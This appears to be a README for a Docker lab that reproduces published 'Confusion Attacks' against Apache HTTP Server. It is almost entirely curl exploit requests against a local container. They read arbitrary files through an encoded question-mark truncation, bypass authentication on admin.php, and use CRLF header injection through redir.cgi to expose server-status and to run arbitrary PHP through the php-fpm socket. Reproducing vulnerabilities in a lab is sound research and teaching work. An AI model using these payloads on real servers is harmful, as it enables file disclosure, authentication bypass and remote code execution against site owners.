# Docker test

Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!

https://blog.orange.tw/2024/08/confusion-attacks-en.html

```
docker build -t apache-lab .
docker run --rm -it --name my-running-app -p 8090:80 apache-lab
```

## Read file

```
curl 'http://localhost:8090/user/orange/secret.yml%3f'
curl http://localhost:8090/html/usr/share/doc/mount/mount.txt%3f
```

## Bypass Auth

```
curl 'http://localhost:8090/admin.php'
curl 'http://localhost:8090/admin.php%3foooo.php'
```

## Server Status

```
curl 'http://localhost:8090/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo%0d%0aContent-Type:server-status%0d%0a%0d%0a'
```

## Run arbitrary PHP

```
curl 'http://localhost:8090/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/ooo?%0d%0aContent-Type:proxy:unix:/run/php/php8.2-fpm.sock|fcgi://127.0.0.1/usr/share/anyscript.php%3f%0d%0a%0d%0a'

```
